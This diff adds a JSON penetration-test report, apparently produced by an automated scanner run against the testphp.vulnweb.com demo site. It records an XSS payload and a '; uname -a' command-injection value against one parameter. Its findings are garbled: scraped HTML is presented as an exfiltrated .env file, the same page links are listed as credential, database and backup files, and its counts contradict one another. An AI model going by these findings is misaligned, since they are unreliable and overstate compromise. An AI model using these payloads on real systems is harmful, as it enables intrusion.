+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "position",
+            "your": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "the",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "width",
+            "your": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "the",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "z-index",
+            "your": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "the",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "clsid",
+            "your": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "the",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "mailto",
+            "your": "wvs@acunetix.com"
+          }
+        }
+      ]
+    },
+    {
+      "type": "XSS",
+      "severity": "high",
+      "payload": "<script>alert(1)</script>",
+      "parameter": "goButton",
+      "session_hijack_possible": false
+    },
+    {
+      "type": "Command Injection",
+      "severity": "critical",
+      "payload": "; uname -a",
+      "parameter": "goButton",
+      "system_info": {},
+      "files_exfiltrated": [
+        {
+          "file": "config_.env",
+          "data": [
+            "template=\"/Templates/main_dynamic_template.dwt.php\"",
+            "codeOutsideHTMLIsLocked=\"false\"",
+            "equiv=\"Content-Type\"",
+            "content=\"text/html;",
+            "charset=iso-8859-2\">"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "credentials",
+          "files": [
+            "/Templates/main_dynamic_template.dwt.php",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/logo.gif",
+            "//www.acunetix.com",
+            "/add.swf",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "config",
+          "files": [
+            "/Templates/main_dynamic_template.dwt.php",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/logo.gif",
+            "//www.acunetix.com",
+            "/add.swf",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "source_code",
+          "files": [
+            "/Templates/main_dynamic_template.dwt.php",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/logo.gif",
+            "//www.acunetix.com",
+            "/add.swf",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "database",
+          "files": [
+            "/Templates/main_dynamic_template.dwt.php",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/logo.gif",
+            "//www.acunetix.com",
+            "/add.swf",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "backups",
+          "files": [
+            "/Templates/main_dynamic_template.dwt.php",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/logo.gif",
+            "//www.acunetix.com",
+            "/add.swf",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "logs",
+          "files": [
+            "/Templates/main_dynamic_template.dwt.php",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/logo.gif",
+            "//www.acunetix.com",
+            "/add.swf",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        }
+      ]
+    }
+  ],
+  "evidence": [],
+  "intelligence": {},
+  "risk_assessment": {
+    "overall_score": 60.0,
+    "severity": "Medium",
+    "cvss_base": 6.0,
+    "exploitability": 0,
+    "vulnerability_count": 0,
+    "exploit_count": 3,
+    "critical_findings": 2
+  },
+  "recommendations": [
+    {
+      "priority": "Critical",
+      "issue": "SQL Injection Vulnerability",
+      "recommendation": "Implement parameterized queries and input validation",
+      "affected_parameter": "goButton"
+    },
+    {
+      "priority": "High",
+      "issue": "Cross-Site Scripting (XSS)",
+      "recommendation": "Implement output encoding and Content Security Policy",
+      "affected_parameter": "goButton"
+    },
+    {
+      "priority": "Critical",
+      "issue": "Command Injection Vulnerability",
+      "recommendation": "Never pass user input directly to system commands. Use whitelisting.",
+      "affected_parameter": "goButton"
+    },
+    {
+      "priority": "High",
+      "issue": "General Security Posture",
+      "recommendation": "Implement Web Application Firewall (WAF)",
+      "affected_parameter": "All"
+    },
+    {
+      "priority": "Medium",
+      "issue": "Security Headers",
+      "recommendation": "Add security headers: CSP, X-Frame-Options, HSTS",
+      "affected_parameter": "HTTP Response"
+    }
+  ],
+  "executive_summary": {
+    "target": "http://testphp.vulnweb.com",
+    "test_date": "2025-11-05",
+    "duration": "0.00 seconds",
+    "phases_completed": 14,
+    "vulnerabilities_found": 15,
+    "exploits_successful": 3,
+    "critical_findings": 2,
+    "risk_level": "Medium",
+    "overall_score": 60.0
+  },
+  "technical_details": {
+    "methodology": "IQ 200 Ultimate Pentest - NSA-Level Framework",
+    "phases": [
+      "Target Reconnaissance",
+      "WAF Detection",
+      "Attack Surface Mapping",
+      "Payload Generation",
+      "Vulnerability Scanning",
+      "Automated Exploitation",
+      "SQL Injection & Data Exfiltration",
+      "Command Injection & File Hunting",
+      "XSS & Client-Side Attacks",
+      "Authentication Bypass",
+      "Business Logic Testing",
+      "Post-Exploitation",
+      "Evidence Collection",
+      "Risk Assessment"
+    ],
+    "tools_used": [
+      "NSA-Level Exploitation",
+      "IQ 200 Data Exfiltrator",
+      "IQ 200 File Hunter",
+      "Genetic Payload Engine"
+    ],
+    "total_findings": 15,
+    "evidence_items": 0
+  },
+  "timeline": [],
+  "status": "running"
+}
